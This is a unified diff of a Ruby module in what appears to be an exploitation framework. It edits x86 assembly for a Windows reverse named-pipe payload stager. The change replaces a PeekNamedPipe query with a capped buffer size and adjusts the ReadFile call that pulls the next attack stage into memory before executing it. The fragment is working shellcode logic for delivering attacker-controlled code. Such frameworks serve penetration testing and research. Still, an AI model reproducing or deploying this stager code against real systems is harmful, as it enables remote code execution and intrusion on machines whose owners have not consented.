@@ -208,21 +208,14 @@ module Payload::Windows::ReverseNamedPipe
         push ebx                ; push the address of the new stage so we can return into it
 
       read_more:
-        ; Query/read the bytes that are on the pipe first using PeekNamedPipe
-        push eax                ; space for the number of bytes
-        mov eax, esp            ; store the pointer
-        push 0                  ; lpBytesLeftThisMessage
-        push eax                ; lpTotalBytesAvail
-        push 0                  ; lpBytesRead
-        push esi                ; nBufferSize
-        push ebx                ; lpBuffer
-        push edi                ; hFile
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'PeekNamedPipe')}
-        call ebp                ; PeekNamedPipe(...) to query
-        pop ecx                 ; Get the bytes read/available
-        push ecx                ; leave the result on the stack
+        ; prepare the size min(0x10000, esi)
+        mov ecx, 0x10000         ; stupid named pipe buffer limit
+        cmp ecx, esi
+        jle size_is_good
+        mov ecx, esi
 
-        ; Invoke a read to flush the read data
+      size_is_good:
+        ; Invoke a read
         push eax                ; space for the number of bytes
         mov eax, esp            ; store the pointer
         push 0                  ; lpOverlapped
@@ -232,7 +225,6 @@ module Payload::Windows::ReverseNamedPipe
         push edi                ; hFile
         push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
         call ebp                ; ReadFile(...) to read the data
-        pop ecx                 ; Ignore the result from readfile
     ^
 
     if reliable
